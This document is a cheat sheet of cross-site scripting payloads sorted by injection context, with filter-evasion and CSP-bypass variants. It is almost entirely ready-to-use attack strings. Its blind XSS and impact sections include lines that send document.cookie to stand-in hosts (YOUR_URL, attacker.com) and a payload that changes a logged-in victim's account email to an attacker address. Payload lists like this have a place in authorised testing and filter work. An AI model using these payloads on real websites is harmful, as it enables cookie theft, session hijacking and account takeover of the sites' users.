# XSS Payloads by Context

## HTML Body
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<input autofocus onfocus=alert(document.domain)>
<video src=x onerror=alert(document.domain)>

## HTML Attribute
" onmouseover="alert(document.domain)
" autofocus onfocus="alert(document.domain)
"><img src=x onerror=alert(document.domain)>
' onmouseover='alert(document.domain)

## JavaScript String
";alert(document.domain)//
';alert(document.domain)//
</script><script>alert(document.domain)</script>
${alert(document.domain)}

## href / src
javascript:alert(document.domain)
data:text/html,<script>alert(document.domain)</script>
java&#9;script:alert(document.domain)

## Filter Evasion
<svg/onload=alert(document.domain)>
<ScRiPt>alert(document.domain)</ScRiPt>
<scr<script>ipt>alert(document.domain)</scr</script>ipt>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
alert`document.domain`
window['al'+'ert'](1)

## Polyglots
">'><svg/onload=alert(document.domain)>
">'><img src=x onerror=alert(document.domain)>

## Blind XSS (replace YOUR_URL)
<script src="http://YOUR_URL/xss.js"></script>
<img src=x onerror="fetch('http://YOUR_URL/?c='+btoa(document.cookie))">

## CSP Bypass
<base href="https://attacker.com/">
<script src="https://whitelisted-cdn.com/api?callback=alert(1)//"></script>
{{constructor.constructor('alert(document.domain)')()}}

## Impact
<script>new Image().src='https://attacker.com/?c='+encodeURIComponent(document.cookie)</script>
<script>fetch('/api/account',{method:'PATCH',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'attacker@evil.com'})})</script>

## SVG Upload
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><circle cx="50" cy="50" r="40"/></svg>
